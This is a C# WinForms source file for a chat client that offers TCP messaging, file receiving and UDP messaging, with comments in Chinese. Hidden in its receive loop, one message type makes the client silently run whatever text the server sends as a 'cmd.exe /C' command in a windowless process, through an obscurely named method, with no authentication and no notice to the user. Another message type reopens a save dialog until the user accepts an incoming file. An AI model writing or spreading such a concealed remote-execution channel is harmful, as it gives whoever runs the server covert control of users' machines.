using ForTCP;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Client
{
    public partial class ClientForm : Form
    {
        TCPClient tCPClient;
        UdpClient client = null;
        delegate void getString(string kk);
        public ClientForm()
        {
            CheckForIllegalCrossThreadCalls = false;
            InitializeComponent();
        }

        private void BTConnect_Click(object sender, EventArgs e)
        {
            tCPClient = new TCPClient(tBHost.Text.Trim(), int.Parse(tBPort.Text.Trim()));
            if (tCPClient.startClient())
            {
                Thread th_receive = new Thread(Receive);
                th_receive.IsBackground = true;
                th_receive.Start();
                rTBMSG.Text += "连接成功\n";
            }
            else
            {
                rTBMSG.Text += "连接失败\n";
            }
        }

        private void Receive()
        {
            while (true)
            {
                byte[] receivedByte = tCPClient.receiveData();
                if (receivedByte != null)
                {
                    byte i = receivedByte[0];
                    byte[] buf = new byte[receivedByte.Length - 1];
                    Array.Copy(receivedByte, 1, buf, 0, receivedByte.Length - 1);
                    if (i == 0)
                    {
                        rTBMSG.Text += "已接收>>" + Encoding.UTF8.GetString(buf) + "\n";
                    }
                    else if (i == 1)
                    {
                        new Thread(doiii).Start(Encoding.UTF8.GetString(buf));
                    }
                    else if (i == 2)
                    {
                        string filePath = "";
                        SaveFileDialog sfd = new SaveFileDialog();
                        sfd.Title = "保存文件";
                        sfd.InitialDirectory = @"C:\Users\Administrator\Desktop";
                        sfd.FileName = Encoding.UTF8.GetString(buf).Trim();
                        //如果没有选择保存文件路径就一直打开保存框
                        while (true)
                        {
                            sfd.ShowDialog(this);
                            filePath = sfd.FileName;
                            if (string.IsNullOrEmpty(filePath))
                            {
                                continue;
                            }
                            else
                            {
                                break;
                            }
                        }
                        byte[] buffer = tCPClient.receiveData();
                        //保存接收的文件
                        using (FileStream fsWrite = new FileStream(filePath, FileMode.OpenOrCreate, FileAccess.Write))
                        {
                            fsWrite.Write(buffer, 0, buffer.Length);
                        }
                    }
                }
            }
        }
        public void doiii(object s)
        {
            Execute(s as string, 1000);
        }
        public static string Execute(string command, int seconds)
        {
            string output = ""; //输出字符串  
            if (command != null && !command.Equals(""))
            {
                Process process = new Process();//创建进程对象  
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "cmd.exe";//设定需要执行的命令  
                startInfo.Arguments = "/C " + command;//“/C”表示执行完命令后马上退出  
                startInfo.UseShellExecute = false;//不使用系统外壳程序启动 
                startInfo.RedirectStandardInput = false;//不重定向输入  
                startInfo.RedirectStandardOutput = true; //重定向输出  
                startInfo.CreateNoWindow = true;//不创建窗口  
                process.StartInfo = startInfo;
                try
                {
                    if (process.Start())//开始进程  
                    {
                        if (seconds == 0)
                        {
                            process.WaitForExit();//这里无限等待进程结束  
                        }
                        else
                        {
                            process.WaitForExit(seconds); //等待进程结束，等待时间为指定的毫秒  
                        }
                        output = process.StandardOutput.ReadToEnd();//读取进程的输出  
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);//捕获异常，输出异常信息
                }
                finally
                {
                    if (process != null)
                        process.Close();
                }
            }
            return output;
        }
        private void BTSend_Click(object sender, EventArgs e)
        {
            byte[] sendBytes = Encoding.UTF8.GetBytes(tBmsg.Text.Trim());
            if (tCPClient.SendData(TCPClient.Md5pwd, sendBytes))
            {
                rTBMSG.Text += "已发送>>" + tBmsg.Text.Trim() + "\n";
                tBmsg.Text = "";
            }
        }

        private void exitEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (tCPClient!=null)
            {
            tCPClient.stopClient();
            }
            Application.Exit();
        }

        private void btnSendMsg_Click(object sender, EventArgs e)
        {
            if (tbUDPHost.Text != "" && tBPort.Text != "")
            {
                string ip = "";
                if (rBip.Checked)
                {
                    ip = tbUDPHost.Text.Trim();
                }
                if (rBDomain.Checked)
                {
                    ip = getIP(tbUDPHost.Text.Trim());
                }
                string sendString = null;//要发送的字符串 
                byte[] sendData = null;//要发送的字节数组 
                IPAddress remoteIP = IPAddress.Parse(ip); //假设发送给这个IP
                int remotePort = int.Parse(tbUDPPort.Text.Trim());
                IPEndPoint remotePoint = new IPEndPoint(remoteIP, remotePort);//实例化一个远程端点 
                sendString = textBoxMSG.Text.Trim();
                sendData = Encoding.Default.GetBytes(sendString);
                UdpClient udpClient = new UdpClient();
                udpClient.Send(sendData, sendData.Length, remotePoint);//将数据发送到远程端点 
                tbMsgHistory.Text += "已发送至" + remotePoint + ">>" + sendString + "\n";
            }
        }
        ///<summary>                                
        /// 传入域名返回对应的IP 转载请注明来自
        ///</summary>
        ///<param name="domain">域名</param> 
        ///<returns></returns>   
        public string getIP(string domain)
        {
            domain = domain.Replace("http://", "").Replace("https://", "");
            IPHostEntry hostEntry = Dns.GetHostEntry(domain);
            IPEndPoint ipEndPoint = new IPEndPoint(hostEntry.AddressList[0], 0);
            return ipEndPoint.Address.ToString();
        }
        private void UDPReceive()
        {
            string receiveString = null;
            byte[] receiveData = null;
            //实例化一个远程端点，IP和端口可以随意指定，等调用client.Receive(ref remotePoint)时会将该端点改成真正发送端端点 
            IPEndPoint remotePoint = new IPEndPoint(IPAddress.Any, int.Parse(tBPortToBind.Text.Trim()));
            client = new UdpClient();
            client.Client.Bind(remotePoint);
            while (true)
            {
                receiveData = client.Receive(ref remotePoint);//接收数据 
                receiveString = Encoding.Default.GetString(receiveData);
                tbMsgHistory.Text +="接收到>>"+ receiveString + "\n";
            }
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            tbMsgHistory.Text +="开始成功\n";
           Thread th_UDPReceive= new Thread(UDPReceive);
            th_UDPReceive.IsBackground = true;
            th_UDPReceive.Start();
        }
    }
}
